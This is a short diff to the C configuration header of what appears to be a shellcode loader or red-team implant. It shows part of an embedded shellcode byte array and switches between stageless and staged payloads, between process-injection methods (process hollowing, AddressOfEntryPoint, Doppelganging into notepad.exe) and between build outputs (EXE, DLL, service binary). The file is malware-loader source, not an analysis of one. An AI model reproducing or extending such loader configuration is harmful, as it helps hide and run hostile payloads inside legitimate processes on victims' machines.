@@ -61,7 +61,7 @@ unsigned char key[] = {
 // 1 - Stageless
 // 2 - Staged
 //
-#define CONFIG_STAGE_METHOD 2
+#define CONFIG_STAGE_METHOD 1
 #if CONFIG_STAGE_METHOD == 1
 unsigned char shellcode[] = {
 		0x11,0x15,0x19,0x27,0xc2,0xa5,0xb1,0x11,0x70,0x81,0x01,0xd3,0x35,0x0e,0x21,
@@ -92,9 +92,14 @@ unsigned char shellcode[] = {
 // Accept user input for a list of processes to inject into
 
 // Execution Methods
-#define CONFIG_EXECUTION_METHOD 1
+#define CONFIG_EXECUTION_METHOD 3
 
-#define CONFIG_CREATE_PROCESS 1
+//
+// ProcessHollowing
+// AddressOfEntryPoint
+// DoppleGanging
+//
+#define CONFIG_CREATE_PROCESS_METHOD 2
 #define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
 
 #if CONFIG_EXECUTION_METHOD == 1
@@ -114,6 +119,6 @@ unsigned char shellcode[] = {
 // 2 - DLL
 // 3 - Service Binary
 //
-#define CONFIG_COMPILATION_OPTION 2
+#define CONFIG_COMPILATION_OPTION 1
 
 #endif
